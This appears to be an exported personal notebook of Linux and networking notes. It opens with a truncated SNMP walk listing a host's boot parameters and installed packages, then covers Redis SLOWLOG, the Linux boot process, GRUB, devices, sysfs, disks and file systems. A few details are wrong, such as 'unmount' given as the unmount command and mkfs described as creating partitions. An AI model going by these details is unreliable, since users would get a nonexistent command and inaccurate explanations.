iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (3676678) 10:12:46.78
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E5 09 14 0E 2B 2D 00 2B 02 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/boot/vmlinuz-5.11.0-34-generic root=UUID=9a6a5c52-f92a-42ea-8ddf-940d7e0f4223 ro quiet splash"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 3
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 411
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)

...SNIP...

iso.3.6.1.2.1.25.6.3.1.2.1232 = STRING: "printer-driver-sag-gdi_0.1-7_all"
iso.3.6.1.2.1.25.6.3.1.2.1233 = STRING: "printer-driver-splix_2.0.0+svn315-7fakesync1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1234 = STRING: "procps_2:3.3.16-1ubuntu2.3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1235 = STRING: "proftpd-basic_1.3.6c-2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1236 = STRING: "proftpd-doc_1.3.6c-2_all"
iso.3.6.1.2.1.25.6.3.1.2.1237 = STRING: "psmisc_23.3-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1238 = STRING: "publicsuffix_20200303.0012-1_all"
iso.3.6.1.2.1.25.6.3.1.2.1239 = STRING: "pulseaudio_1:13.99.1-1ubuntu3.12_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1240 = STRING: "pulseaudio-module-bluetooth_1:13.99.1-1ubuntu3.12_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1241 = STRING: "pulseaudio-utils_1:13.99.1-1ubuntu3.12_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1242 = STRING: "python-apt-common_2.0.0ubuntu0.20.04.6_all"
iso.3.6.1.2.1.25.6.3.1.2.1243 = STRING: "python3_3.8.2-0ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1244 = STRING: "python3-acme_1.1.0-1_all"
iso.3.6.1.2.1.25.6.3.1.2.1245 = STRING: "python3-apport_2.20.11-0ubuntu27.21_all"
iso.3.6.1.2.1.25.6.3.1.2.1246 = STRING: "python3-apt_2.0.0ubuntu0.20.04.6_amd64" 

...SNIP...
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ssh"><a class="header" href="#ssh">SSH</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="tls"><a class="header" href="#tls">TLS</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="udp-1"><a class="header" href="#udp-1">UDP</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="websockets"><a class="header" href="#websockets">WebSockets</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="redis-1"><a class="header" href="#redis-1">Redis</a></h1>
<h2 id="directory-map-23"><a class="header" href="#directory-map-23">Directory Map</a></h2>
<ul>
<li><a href="#redis-2">redis</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="redis-2"><a class="header" href="#redis-2">redis</a></h1>
<p><img src="redis/redis_arch.png" title="Redis" alt="redis_architecture"></p>
<h2 id="slowlog"><a class="header" href="#slowlog">Slowlog</a></h2>
<p>https://redis.io/commands/slowlog-get/</p>
<p>‚Ä¶
The SLOWLOG GET command returns entries from the slow log in chronological order</p>
<p>The Redis Slow Log is a system to log queries that exceeded a specified execution time. The execution time does not include I/O operations like talking with the client, sending the reply and so forth, but just the time needed to actually execute the command (this is the only stage of command execution where the thread is blocked and can not serve other requests in the meantime).</p>
<p>A new entry is added to the slow log whenever a command exceeds the execution time threshold defined by the slowlog-log-slower-than configuration directive. The maximum number of entries in the slow log is governed by the slowlog-max-len configuration directive.</p>
<p>By default the command returns latest ten entries in the log. The optional count argument limits the number of returned entries, so the command returns at most up to count entries, the special number -1 means return all entries.</p>
<p>Each entry from the slow log is comprised of the following six values:</p>
<ol>
<li>A unique progressive identifier for every slow log entry.</li>
<li>The unix timestamp at which the logged command was processed.</li>
<li>The amount of time needed for its execution, in microseconds.</li>
<li>The array composing the arguments of the command.</li>
<li>Client IP address and port.</li>
<li>Client name if set via the CLIENT SETNAME command.</li>
</ol>
<p>The entry‚Äôs unique ID can be used in order to avoid processing slow log entries multiple times (for instance you may have a script sending you an email alert for every new slow log entry). The ID is never reset in the course of the Redis server execution, only a server restart will reset it.</p>
<pre><code>SLOWLOG GET [count]
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="systems"><a class="header" href="#systems">Systems</a></h1>
<p>Notes on Linux systems administration, kernel internals, and system-level concepts.</p>
<h2 id="core-topics"><a class="header" href="#core-topics">Core Topics</a></h2>
<h3 id="system-fundamentals"><a class="header" href="#system-fundamentals">System Fundamentals</a></h3>
<ul>
<li><a href="#linux-kernel-boot-process">Linux Kernel Boot Process</a></li>
<li><a href="#common-files-and-directories">Common Files and Directories</a></li>
<li><a href="#devices">Devices</a></li>
<li><a href="#disks">Disks</a></li>
<li><a href="#file-systems">File Systems</a></li>
<li><a href="#groups-1">Groups</a></li>
<li><a href="#hashing-1">Hashing</a></li>
<li><a href="#hard-and-soft-links">Hard and Soft Links</a></li>
<li><a href="#lvm-logical-volume-manager">LVM (Logical Volume Manager)</a></li>
<li><a href="#memory">Memory</a></li>
<li><a href="#memory-management">Memory Management</a></li>
<li><a href="#networking-1">Networking</a></li>
<li><a href="#network-manager">Network Manager</a></li>
<li><a href="#permissions">Permissions</a></li>
<li><a href="#processes">Processes</a></li>
<li><a href="#troubleshooting-storage">Storage</a></li>
<li><a href="#time">Time</a></li>
<li><a href="#users-and-user-management">Users and User Management</a></li>
</ul>
<h3 id="system-services-and-configuration"><a class="header" href="#system-services-and-configuration">System Services and Configuration</a></h3>
<ul>
<li><a href="#systemd">Systemd</a></li>
<li><a href="#pluggable-authentication-modules-pam">PAM (Pluggable Authentication Modules)</a></li>
<li><a href="#logging">Logging</a></li>
<li><a href="#scheduled-tasks">Scheduled Tasks</a></li>
<li><a href="#bash-startup-files">Bash Startup Files</a></li>
</ul>
<h3 id="development-and-tools"><a class="header" href="#development-and-tools">Development and Tools</a></h3>
<ul>
<li><a href="#dev-tools">Development Tools</a></li>
<li><a href="#make">Make</a></li>
<li><a href="#commands-2">Linux Commands</a></li>
</ul>
<h3 id="system-internals"><a class="header" href="#system-internals">System Internals</a></h3>
<ul>
<li><a href="#kernel-subsystems">Kernel</a></li>
<li><a href="#interrupts-and-traps">Interrupts</a></li>
<li><a href="#system-calls">System Calls</a></li>
<li><a href="#key-value-store">Key-Value Stores</a></li>
</ul>
<h3 id="observability-and-troubleshooting"><a class="header" href="#observability-and-troubleshooting">Observability and Troubleshooting</a></h3>
<ul>
<li><a href="#linux-observability-sources">Observability Sources</a></li>
<li><a href="#per-process-analysis">Per-Process Analysis</a></li>
<li><a href="#system-wide-analysis">System-Wide Analysis</a></li>
<li><a href="#troubleshooting">Troubleshooting</a></li>
</ul>
<h2 id="subdirectories"><a class="header" href="#subdirectories">Subdirectories</a></h2>
<h3 id="bash"><a class="header" href="#bash"><a href="systems/bash">Bash</a></a></h3>
<p>Shell scripting and bash-specific notes</p>
<ul>
<li><a href="#bash-notes">Bash Notes</a></li>
<li><a href="#moving-the-cursor-1">Keyboard Shortcuts</a></li>
</ul>
<h3 id="commands-1"><a class="header" href="#commands-1"><a href="systems/commands">Commands</a></a></h3>
<p>Detailed documentation for specific Linux commands</p>
<ul>
<li><a href="#chgrp">chgrp</a></li>
<li><a href="#chmod">chmod</a></li>
<li><a href="#chown">chown</a></li>
<li><a href="#dd">dd</a></li>
<li><a href="#groups-2">groups</a></li>
<li><a href="#ip">ip</a></li>
<li><a href="#job-control">Job Control</a></li>
<li><a href="#kill">kill</a></li>
<li><a href="#lsscsi">lsscsi</a></li>
<li><a href="#passwd">passwd</a></li>
<li><a href="#ps">ps</a></li>
<li><a href="#umask">umask</a></li>
</ul>
<h3 id="greybeard-qualification"><a class="header" href="#greybeard-qualification"><a href="systems/greybeard-qualification">Greybeard Qualification</a></a></h3>
<p>Advanced Linux system administration topics</p>
<ul>
<li><a href="#block-devices-and-file-systems">Block Devices and File Systems</a></li>
<li><a href="#memory-management-1">Memory Management</a></li>
<li><a href="#execution-and-scheduling-of-processes-and-threads">Process Execution and Scheduling</a></li>
<li><a href="#process-structure-and-ipc">Process Structure and IPC</a></li>
<li><a href="#startup-and-init">Startup and Init</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="linux-kernel-boot-process"><a class="header" href="#linux-kernel-boot-process">Linux Kernel Boot Process</a></h1>
<p>High Level Process:</p>
<ol>
<li>The machine‚Äôs BIOS or EUFI loads and runs a boot loader</li>
<li>The boot loader finds the kernel image on disk, loads it into memory, and starts it.</li>
<li>The kernel takes over and initializes the devices and drivers for each. This happens in the following order:
<ol>
<li>CPU inspection</li>
<li>memory inspection</li>
<li>device bus discovery</li>
<li>device discovery</li>
<li>Auxiliary kernel subsystem setup (networking, etc.)</li>
</ol>
</li>
<li>The kernel mounts the root filesystem</li>
<li>The kernel starts a program called init (systemd) with a PID of 1. This point is the user-space startup.</li>
<li>init sets the rest of the system processes in motion</li>
<li>At some point, init starts a process allowing you to login, usually at the end or near the end of the boot sequence.</li>
</ol>
<p>The best way to view the boot process diagnostic logs is with <code>journalctl</code>. You can use <code>journalctl -k</code> to view messages from the current boot. You can use the <code>-b</code> option to view messages from previous boots. You can also check for a log file such as <code>/var/log/kern.log</code> or run the <code>dmesg</code> command to view the messages in the kernel ring buffer.</p>
<h2 id="kernel-parameters"><a class="header" href="#kernel-parameters">Kernel parameters</a></h2>
<p>When the linux kernel starts, it receives a list of text parameters containg a few additional system details. The parameters specify many different types of behavior, such as the amount of diagnostic output the kernel should produce and device driver-specific options.</p>
<ul>
<li>You can view the parameters passed to the kernel by looking at the <code>/proc/cmdline</code> file:
<pre><code>root@nginx-vm-00:~# cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-5.15.0-1029-azure root=PARTUUID=c51187ab-04cc-499f-8947-0211dc8d74e7 ro console=tty1 console=ttyS0 earlyprintk=ttyS0 panic=-1
</code></pre>
Upon encountering a parameter that the kernel does not understand, the kernel passes that parameter to the init system. For example, if you were to pass the <code>-s</code> parameter to the kernel, the kernel would pass that parameter to systemd to boot the system into single-user mode. Read the <code>bootparam(7)</code> man page for more info on kernel boot parameters.</li>
</ul>
<h2 id="boot-loaders"><a class="header" href="#boot-loaders">Boot Loaders</a></h2>
<ul>
<li>At the start of the boot process, a boot loader starts the kernel. It loads the kernel into memory from somewhere on disk, and then starts the kernel with a set of kernel parameters as described above. This process sounds simple, right? Well, it gets a bit more complicated. Some questions need to be answered: ‚Äúwhere is the kernel?‚Äù and ‚Äúwhat boot parameters do we use?‚Äù. It seems like these answers should be easy to find. But remember, the kernel is not yet running, and it‚Äôs the kernel‚Äôs job to traverse a file system to locate files. We have a ‚Äòchicken and egg‚Äô problem.</li>
<li>A boot loader does need a driver to access a disk. On PCs, the boot loader uses the BIOS of UEFI to access disks. Disk hardware typically includes firmware that allows the BIOS or UEFI to acecss attached storage hardware via Logical Block Addressing (LBA). LBA is a universal, simple way to access data from any disk.</li>
<li>To determine if your system uses BIOS or UEFI, you can run <code>efibootmgr</code>. If you get a list of boot devices, your system is using UEFI. If you get an error stating UEFI parameters are not supported, your system is using BIOS. Alternatively, if <code>/sys/firmware/efi</code> exists, your system is using UEFI.</li>
<li>Boot loaders typically allow users to switch between different kernels and operating systems.</li>
<li>Common Boot Loaders
<ul>
<li>GRUB = Used on most linux systems. Supports BIOS and UEFI</li>
<li>LILO = One of the first boot loaders available for linux.</li>
<li>SYSLINUX</li>
<li>systemd-boot</li>
<li>coreboot</li>
</ul>
</li>
<li>Accessing the boot loader may be different on each system. Linux distrobutions tend to heavily modify the boot loader, causing some confusion. On a PC, you can typically hold down <code>shift</code> or <code>esc</code> to access the boot loader shortly after powering on the system.</li>
<li>To generate a grub configuration file:
<ul>
<li>grub2-mkconfig -o /boot/grub2/grub.cfg for BIOS systems</li>
<li>grub2-mkconfig -o /boot/efi/EFI/grub.cfg for EFI systems</li>
<li>grub2-install can be used to install grub on a disk</li>
<li>The boot loader is typically stored on the first few sectors of a disk</li>
<li>The grub2.cfg file is typically stored at /boot/grub2/grub.cfg for BIOS systems</li>
</ul>
</li>
<li>/etc/default/grub is used by the grub2-mkconfig utility to determine what settings to use when it generates the grub2.cfg file. After you modify this file, you need to run <code>grub2-mkconfig</code> to actually regenerate the grub2 config
<pre><code class="language-shell">GRUB_TIMEOUT=1
GRUB_TIMEOUT_STYLE=countdown
GRUB_DISTRIBUTOR="$(sed 's, release .*$,,g' /etc/system-release)"
GRUB_DEFAULT=saved
GRUB_DISABLE_SUBMENU=true
GRUB_TERMINAL="serial console"
GRUB_CMDLINE_LINUX="console=tty1 console=ttyS0,115200n8 earlyprintk=ttyS0,115200 rootdelay=300 scsi_mod.use_blk_mq=y crashkernel=auto"
GRUB_DISABLE_RECOVERY="true"
GRUB_ENABLE_BLSCFG=true
GRUB_SERIAL_COMMAND="serial --speed=115200 --unit=0 --word=8 --parity=no --stop=1"
</code></pre>
</li>
<li>Install, Configure, and Troubleshoot BootLoaders
<ul>
<li>To regenerate grub2 config:
<ul>
<li>Boot into recovery media, then:
<ul>
<li><code>chroot /mnt/sysroot</code></li>
<li>To regenerate grub config for BIOS system
<ul>
<li><code>grub2-mkconfig -o /boot/grub2/grub.cfg</code></li>
</ul>
</li>
<li>To regenerate grub config for EFI system:
<ul>
<li><code>grub2-mkconfig -o /boot/efi/EFI/centos/grub.cfg</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>To reinstall the boot loader:
<ul>
<li>BIOS systems:
<ul>
<li>Use <code>lsblk</code> to look at block devices. Try to identify the boot device</li>
<li>Use <code>grub2-install /dev/sda</code> to install grub to the boot device</li>
</ul>
</li>
<li>EFI Systems:</li>
<li>Use <code>dnf reinstall grub2-efi grub2-efi-modules shim</code> to reinstall grub to the boot device</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="grub"><a class="header" href="#grub">Grub</a></h3>
<ul>
<li>The grub configuration directory is usually <code>/boot/grub</code> or <code>/boot/grub2</code> (grub2 on redhat distros)</li>
<li>The main configuration file for grub is <code>grub.cfg</code>. Do not modify this file directly, instead use <code>grub-mkconfig</code>. The files in <code>/etc/grub.d</code> are shell scripts that make up the <code>grub.cfg</code>. When you call <code>grub-mkconfig</code>, it references these scripts in <code>/etc/grub.d</code> to create the <code>grub.cfg</code>. To modify the grub configuration, simply add another script to this directory. Then call <code>grub-mkconfig</code>, overwriting the <code>/boot/grub/grub.cfg</code> file: <code>grub-mkconfig -o /boot/grub/grub.cfg</code></li>
<li>To (re)install grub, you can use <code>grub-install</code>
<ul>
<li>Example for installing grub on a mounted storage device: <code>grub-install --boot-directory=/mnt/boot /dev/sdc</code></li>
</ul>
</li>
</ul>
<h3 id="user-space-init"><a class="header" href="#user-space-init">User space init</a></h3>
<p>Process overview:</p>
<ol>
<li>init system starts (typically systemd)
<ul>
<li>See <a href="#systemd">systemd</a></li>
</ul>
</li>
<li>Essential low-level services start (think udevd and syslogd)</li>
<li>Network services start</li>
<li>Mid and high-level services start (cron, printing, etc.)</li>
<li>Login prompts, GUIs, and high-level apps, such as web servers start</li>
</ol>
<h3 id="shutting-down-the-system"><a class="header" href="#shutting-down-the-system">Shutting down the system</a></h3>
<ul>
<li>You can use <code>sudo systemctl reboot --force</code> to force a system to reboot</li>
<li>only the superuser can reboot</li>
<li><code>shutdown</code> takes a time parameter for scheduling a shutdown.
<ul>
<li>ex: <code>shutdown 03:00</code> = shutdown at 3AM</li>
<li><code>shutdown +15</code> shutdown in 15 minutes</li>
<li>If you specify a time in the future, the shutdown command creates a file called <code>/etc/nologin</code> and no one but the superuser is able to login to the system.</li>
<li>When the shutdown time arrives, shutdown tells the init system to begin the shutdown process. On a system using systemd, this means activating the shutdown units.</li>
</ul>
</li>
<li>If you halt the system, it shuts the machine down immediately. To do this, run: <code>shutdown -h now</code> or <code>halt</code>
<ul>
<li>On most versions of Linux, a halt cuts power to the system. This can be unforgiving, as it does not give disk buffers time to sync (potentially causing corrupt data).</li>
</ul>
</li>
<li>The shutdown process:
<ol>
<li>init asks every process to shut down cleanly</li>
<li>If a process doesn‚Äôt respond after a while, init kills it, first trying a TERM signal</li>
<li>If the TERM signal doesn‚Äôt work, init uses the KILL signal</li>
<li>The system locks system files to prevent modification</li>
<li>The system unmounts all filesystems other than root</li>
<li>The system remounts root as read-only</li>
<li>The final step is to call the kernel to reboot or stop with the <code>reboot(2)</code> system call</li>
</ol>
</li>
</ul>
<h3 id="initram-fs"><a class="header" href="#initram-fs">InitRam FS</a></h3>
<ul>
<li>We need the initramfs because the kernel does not talk directly to the PC BIOS or EFI to get data from disks. So in order to mount its root filesystem, it needs driver support for the underlying storage. There are so many storage controllers that having a driver for each one in the kernel is not feasible. Therefore, these drivers are shipped as loadable modules. These modules exist on disk, so we have a chicken and egg scenario. How can the kernel load these drivers from disk if it cannot read the disk because it doesn‚Äôt currently have these drivers loaded?</li>
<li>The workaround is to gather these drives along with a few other utilities into a <code>cpio</code> archive. The boot loader loads this archive into memory before running the kernel. Upon start, the kernel reads the contents of the archive into a temp file system in RAM known as the initramfs, mounts it at <code>/</code>, and performs the user-mode handoff to the init on the initramfs. Then, the utilities included in the initramfs allow the kernel to load the necessary driver modules for the real root filesystem. Finally, the utilities mount the real root filesystem and start the init system.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="common-files-and-directories"><a class="header" href="#common-files-and-directories">Common Files and Directories</a></h1>
<p>Most system configuration files on a Linux system are found in <code>/etc</code></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="dev-tools"><a class="header" href="#dev-tools">Dev Tools</a></h1>
<h2 id="gcc-c-compiler"><a class="header" href="#gcc-c-compiler">GCC (c compiler)</a></h2>
<p>
The c compiler on most Unix systems is the GNU C Compiler (gcc).
</p>

<p>Here is a classic program written in c:</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;

int main(){
  printf("Hello, World!\n");
}
</code></pre>
<p>You can compile it by saving it in a file ending with a <code>.c</code> extension, and then running:</p>
<pre><code class="language-sh">cc -o hello hello.c
</code></pre>
<h2 id="shared-libraries"><a class="header" href="#shared-libraries">Shared Libraries</a></h2>
<p>Shared libraries have a <code>.so</code> extension (shared object)</p>
<p>You can see what shared libraries a program uses by running <code>ldd</code>:</p>
<pre><code class="language-sh">ryan:notes/  |main ?:1 ‚úó|$ ldd /bin/bash
        linux-vdso.so.1 (0x00007fff758ab000)
        libtinfo.so.6 =&gt; /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007fae9d281000)
        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fae9d059000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fae9d429000)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="devices"><a class="header" href="#devices">devices</a></h1>
<ul>
<li>The udev service enables user space programs to automatically configure and use new devices.</li>
<li>The kernel presents many IO interfaces for devices as files to user space processes</li>
<li>device files are in the <code>/dev</code> directory</li>
<li>to identify a device and view it‚Äôs properties, use <code>ls -l</code>. Note the first character of each line in the output below. If you see b (block), c (character), p (pipe), or s (socket), the file is a device.
<ul>
<li>
<pre><code class="language-sh">ryan:notes/  |main ‚úì|$ ls -l /dev | head
total 0
crw-------   1 root root       10,   107 Jan  6 15:14 acpi_thermal_rel
crw-r--r--   1 root root       10,   235 Jan  6 15:14 autofs
drwxr-xr-x   2 root root             260 Jan  6 15:14 block/
crw-rw----   1 root disk       10,   234 Jan  6 15:14 btrfs-control
drwxr-xr-x   3 root root              60 Jan  6 15:14 bus/
drwxr-xr-x   2 root root            5960 Jan  7 08:29 char/
crw--w----   1 root tty         5,     1 Jan  6 15:14 console
lrwxrwxrwx   1 root root              11 Jan  6 15:14 core -&gt; /proc/kcore
drwxr-xr-x  10 root root             220 Jan  6 15:14 cpu/
</code></pre>
</li>
</ul>
</li>
</ul>
<h2 id="device-types"><a class="header" href="#device-types">device types</a></h2>
<ul>
<li>block device = hard disks. Data is read in chunks</li>
<li>character device = data is read in streams (monitors, printers, etc.)</li>
<li>pipes = like character devices, except another process is at the end of the IO stream</li>
<li>socket = special purpose interfaces that are typically used for inter-process communications</li>
</ul>
<h2 id="sysfs"><a class="header" href="#sysfs">sysfs</a></h2>
<ul>
<li>The sysfs filesystem is a pseudo-filesystem which provides an interface to kernel data structures.</li>
<li>The sysfs filesystem is commonly mounted at /sys.</li>
<li>Many of the files in the sysfs filesystem are read-only, but some files are writable, allowing kernel variables to be changed. To avoid redundancy, symbolic links are heavily used to connect entries across the filesystem tree.</li>
</ul>
<pre><code class="language-sh">ryan:~/ $ ll /sys/
total 4
   1 0 dr-xr-xr-x  13 root root    0 Jan  6 15:14 ./
   2 4 drwxr-xr-x  20 root root 4096 Dec 27 19:39 ../
8359 0 drwxr-xr-x   2 root root    0 Jan  6 15:14 block/
   8 0 drwxr-xr-x  54 root root    0 Jan  6 15:14 bus/
  10 0 drwxr-xr-x  87 root root    0 Jan  6 15:14 class/
   5 0 drwxr-xr-x   4 root root    0 Jan  6 15:14 dev/
   4 0 drwxr-xr-x  29 root root    0 Jan  6 15:14 devices/
  11 0 drwxr-xr-x   6 root root    0 Jan  6 15:14 firmware/
   2 0 drwxr-xr-x  10 root root    0 Jan  6 15:14 fs/
  12 0 drwxr-xr-x   2 root root    0 Jan  6 15:14 hypervisor/
5235 0 drwxr-xr-x  17 root root    0 Jan  6 15:14 kernel/
6394 0 drwxr-xr-x 349 root root    0 Jan  6 15:14 module/
5247 0 drwxr-xr-x   3 root root    0 Jan  6 15:14 power/

</code></pre>
<ul>
<li>The most important directories within <code>/sys</code> are:
<ul>
<li>block = contains info for every block device attached to the system</li>
<li>bus = contains a directory for every bus type in the kernel</li>
<li>hypervisor =</li>
<li>class</li>
<li>devices</li>
<li>kernel</li>
<li>firmware</li>
<li>module</li>
<li>power</li>
</ul>
</li>
</ul>
<p>https://docs.kernel.org/filesystems/sysfs.html
https://www.kernel.org/doc/Documentation/filesystems/sysfs.txt</p>
<h1 id="hard-disks"><a class="header" href="#hard-disks">Hard Disks</a></h1>
<ul>
<li>
<p>Most block devices attached to a Linux system will have a device name with a prefix of /dev/sd*</p>
<ul>
<li>Example: /dev/sda</li>
<li>The ‚Äòsd‚Äô portion stands for SCSI Disk</li>
</ul>
</li>
<li>
<p>To list the SCSI devices on your system, use a tool that walks the SCSI device paths, such as <code>lsscsi</code></p>
<ul>
<li><code>lsscsi</code> is not commonly installed by default</li>
</ul>
</li>
</ul>
<h1 id="udevd"><a class="header" href="#udevd">udevd</a></h1>
<ul>
<li>udevd is responsible for creating device files for attached devices</li>
<li>The process is commonly <code>systemd-udevd</code></li>
<li>The kernel will send a notification to this process upon detecting a new device attached to the system. Udevd will then create a file in user-land for the device.
<ul>
<li>This caused problems because some devices need to be available very early in the boot process, so devtmpfs was created</li>
<li>devtmpfs filesytem is used by the kernel to create device files as necessary, but it also notifies udevd that a new device is available. Upon receiving this signal, udevd does not create a new device file, but it does perform device initialization along with setting permissions and notifying other processes that new devices are available.</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="disks"><a class="header" href="#disks">Disks</a></h1>
<ul>
<li>Modern disks include an on-disk queue for I/O requests. I/O accepted by the disk may either be waiting on the queue or served. While this may imply a first-come, first-served queue, the on-disk controller can apply other algorithms to optimize performance. These algorithms include elevator seeking for rotational disks or separate queues for read and write I/O (especially for flash disks).</li>
</ul>
<h3 id="caching"><a class="header" href="#caching">Caching</a></h3>
<p>The on-disk cache may also be used to increase write performance, by using it as a write-back cache. This signals writes as having completed after the data transfer to cache and before the slower transfer to persistent storage. The counter-term is the write-through cache, which completes writes only after the full transfer to the next level. Storage write-back caches are often coupled with batteries, in case of power failure.</p>
<p>The best caching is no caching at all.</p>
<p>At the disk device driver level and below, caches may include the following:</p>
<ul>
<li>Device Cache</li>
<li>Block Cache</li>
<li>Disk Controller Cache</li>
<li>Storage Array Cache</li>
<li>On-disk Cache</li>
</ul>
<h3 id="measuring-time"><a class="header" href="#measuring-time">Measuring Time</a></h3>
<p>Storage time can be measured as:</p>
<ul>
<li>I/O request time: the entire time from issuing I/O to it‚Äôs completion</li>
<li>I/O Wait time: The time spent waiting in a queue</li>
<li>I/O service time: The time during which the I/O was processing</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="file-systems"><a class="header" href="#file-systems">file systems</a></h1>
<ul>
<li>A file system is like a database. It defines the structure to transform a simple block device into a sophisticated heirarchy of files and directories that users can understand.</li>
<li>File Systems are typically implemented in the Kernel. However, 9P from Plan 9 has inspired the development of user-space file systems. The FUSE (File System in User Space) feature allows file systems to be created in user-space.</li>
<li>The following list shows the most common file systems in use today:
<ul>
<li>ext4 (extended file system, v4)
<ul>
<li>Supports journaling (a small cache outside of the file system) to provide data integrity and hasten booting (introduced with ext3)</li>
<li>The ext4 file system is an incremental improvement over ext2/3 and provides support for larger files and a greater number of directories.</li>
</ul>
</li>
<li>btrfs (b-tree filesystem)
<ul>
<li>a newer file system native to linux, designed to scale beyond the limitations of ext4</li>
</ul>
</li>
<li>FAT (file allocation table)
<ul>
<li>3 types: msdos, vfat, exfat</li>
<li>Used by most removable flash media</li>
<li>Supported by Windows, Darwin, and Linux</li>
</ul>
</li>
<li>XFS
<ul>
<li>A high performance filesystem used by default on some Linux distros, such as RHEL</li>
</ul>
</li>
<li>HFS+
<ul>
<li>An Apple standard filesystem used on Mac systems</li>
</ul>
</li>
<li>ISO 9660
<ul>
<li>Used on CD-ROM discs</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="directories"><a class="header" href="#directories">Directories</a></h4>
<ul>
<li>Directories in Linux (ext file systems) are just a file with a table. The table has 2 columns. The two columns contain the name and the inode of the files within the directory.</li>
</ul>
<h4 id="inodes"><a class="header" href="#inodes">inodes</a></h4>
<ul>
<li>A traditional *nix file system has two primary components: a pool of data blocks where you can store data and a database system that manages that data pool. The database system is centered around the inode data structure. An inode is metadata about a file. Inodes are identified by numbers in an inode table. File names and directories are implemented as inodes.</li>
<li>A directory inode contains a list of filenames and links correspending to other inodes.</li>
<li>To view the inode numbers for any directory, use <code>ls -i</code> or <code>stat &lt;filename&gt;</code></li>
<li>3 time stamps:
<ul>
<li>atime: last time the file was open()</li>
<li>mtime: last time the file was modified</li>
<li>ctime: ctime IS NOT creation time. It is the last time the inode was changed. For example, using chown or chmod will change the ctime.</li>
</ul>
</li>
</ul>
<h4 id="format-a-partition-with-a-file-system"><a class="header" href="#format-a-partition-with-a-file-system">Format a partition with a file system</a></h4>
<ul>
<li>When preparing new storage devices, after partitioning the device, you are ready to create a file system
<ul>
<li>You can use <code>mkfs</code> to create partitions. <code>mkfs</code> has several aliases for each partition type. Example: <code>mkfs.ext4</code>, <code>mkfs.xfs</code>, etc.</li>
<li>mkfs will automatically detect blocks on a device and set some reasonable defaults based on this. Unless you really understand what you are doing, do not change these defaults.</li>
</ul>
</li>
</ul>
<h4 id="mounting-a-file-system"><a class="header" href="#mounting-a-file-system">Mounting a file system</a></h4>
<ul>
<li>After creating a file system on a partition, you can mount it using the <code>mount</code> command
<ul>
<li>Usage: <code>mount -t *type* *device* *mountpoint*</code></li>
<li>Example: <code>mount -t ext4 /dev/sda2 /mnt/mydisk</code></li>
<li>To unmount a file system, use <code>unmount</code>
<ul>
<li>Example: <code>unmount /mnt/mydisk</code></li>
</ul>
</li>
<li>It is recommended to mount a file system with it‚Äôs UUID, rather than it‚Äôs name. Device names are determined by the order in which the kernel finds the device and can change over time.
<ul>
<li>You can use <code>blkid</code> or <code>lsblk -f</code> to identify the UUID of a partition</li>
